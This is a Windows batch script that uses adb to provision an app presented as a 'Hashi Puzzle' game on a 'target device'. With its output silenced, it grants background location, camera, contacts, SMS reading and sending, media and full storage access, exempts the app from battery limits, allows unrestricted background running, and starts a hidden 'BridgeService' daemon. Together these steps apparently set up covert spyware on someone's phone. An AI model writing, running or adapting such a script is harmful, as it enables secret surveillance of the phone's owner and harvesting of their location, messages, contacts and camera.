@echo off
rem ==============================================================================
rem Quick Provisioning Script for DeviceBridge (Hashi Puzzle) - Windows
rem ==============================================================================

set PACKAGE=com.hashibridge.master

echo ======================================================
echo  Provisioning DeviceBridge on target device...
echo ======================================================

echo [1/6] Granting core permissions...
adb shell pm grant %PACKAGE% android.permission.ACCESS_FINE_LOCATION >nul 2>&1
adb shell pm grant %PACKAGE% android.permission.ACCESS_COARSE_LOCATION >nul 2>&1
adb shell pm grant %PACKAGE% android.permission.ACCESS_BACKGROUND_LOCATION >nul 2>&1
adb shell pm grant %PACKAGE% android.permission.CAMERA >nul 2>&1
adb shell pm grant %PACKAGE% android.permission.READ_CONTACTS >nul 2>&1
adb shell pm grant %PACKAGE% android.permission.READ_SMS >nul 2>&1
adb shell pm grant %PACKAGE% android.permission.SEND_SMS >nul 2>&1
adb shell pm grant %PACKAGE% android.permission.POST_NOTIFICATIONS >nul 2>&1
adb shell pm grant %PACKAGE% android.permission.READ_MEDIA_IMAGES >nul 2>&1
adb shell pm grant %PACKAGE% android.permission.READ_MEDIA_VIDEO >nul 2>&1
adb shell pm grant %PACKAGE% android.permission.READ_EXTERNAL_STORAGE >nul 2>&1
adb shell pm grant %PACKAGE% android.permission.WRITE_EXTERNAL_STORAGE >nul 2>&1

echo [2/6] Granting full storage manager (Android 11+)...
adb shell appops set --uid %PACKAGE% MANAGE_EXTERNAL_STORAGE allow >nul 2>&1

echo [3/6] Bypassing Android Doze Battery Optimizations...
adb shell dumpsys deviceidle whitelist +%PACKAGE% >nul 2>&1

echo [4/6] Allowing unrestricted background execution...
adb shell cmd appops set %PACKAGE% RUN_IN_BACKGROUND allow >nul 2>&1
adb shell cmd appops set %PACKAGE% RUN_ANY_IN_BACKGROUND allow >nul 2>&1

echo [5/6] Starting BridgeService background daemon...
adb shell am start-foreground-service -n %PACKAGE%/.BridgeService >nul 2>&1
adb shell am startservice -n %PACKAGE%/.BridgeService >nul 2>&1

echo [6/6] Done!
echo ======================================================
echo  Device provisioning complete.
echo ======================================================
pause
